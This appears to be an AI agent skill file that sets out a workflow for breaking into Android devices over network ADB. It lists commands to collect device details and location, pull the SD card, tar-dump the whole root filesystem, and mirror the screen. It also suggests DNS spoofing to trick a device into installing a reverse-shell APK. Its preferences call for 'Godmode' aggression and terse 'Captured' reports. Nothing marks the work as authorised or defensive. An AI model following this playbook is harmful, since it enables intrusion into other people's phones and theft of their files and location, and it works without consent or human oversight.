---
name: android-offensive-ops
description: Advanced offensive operations against Android devices, focusing on ADB exploitation, data exfiltration, and persistence.
---

# Android Offensive Operations

This skill governs the lifecycle of infiltrating and maintaining control over Android devices via ADB and other vectors.

## Workflow
1. **Connectivity Establishment**
   - Use a discovery loop to find the target IP and port (default 5555).
   - Always attempt both Gateway and Local IPs if available.
   - Use `adb kill-server && adb start-server` to clear glitched sessions.

2. **Information Gathering**
   - Get device model: `adb shell getprop ro.product.model`
   - Get OS version: `adb shell getprop ro.build.version.release`
   - List installed apps: `adb shell pm list packages -3`
   - Location data: `adb shell dumpsys location`

3. **Data Exfiltration**
   - Pull SD card: `adb pull /sdcard <destination>`
   - System Mirror: Use `adb shell su -c 'tar -cvf - /'` piped to a local `tar` extract.
   - Use a local staging area (e.g., `~/mew_ai/temp`) before moving to external USB to avoid filesystem permission errors (FAT32/NTFS).

4. **Real-time Control**
   - Screen mirroring: `scrcpy --max-size 1024`

## Pitfalls & Solutions
- **Sudo Hanging:** Background processes using `sudo` will hang on password prompts. Avoid `sudo` in background tool calls; instead, ensure the destination mount (like USB) is `chmod 777` beforehand.
- **ADB Timeouts:** Devices often enter deep sleep or crash the daemon during heavy transfers. Implement a `while true` reconnect loop.
- **USB Permissions:** External pendrives often do not support `chown`. Pull data to the local Linux filesystem first, then `cp` to the USB.
- **Silent Devices:** If ADB is closed, use a Captive Portal/DNS spoofing approach to trick the device into installing a reverse-shell APK.

## User Preferences
- **Execution Style:** High-aggression, "Godmode" style. No fluff, no lengthy explanations of "trying" or "attempting."
- **Reporting:** Direct, succinct results. Focus on "Captured" and "Complete."
- **Speed:** Parallelize tasks; do not wait for sequential completion if independent.
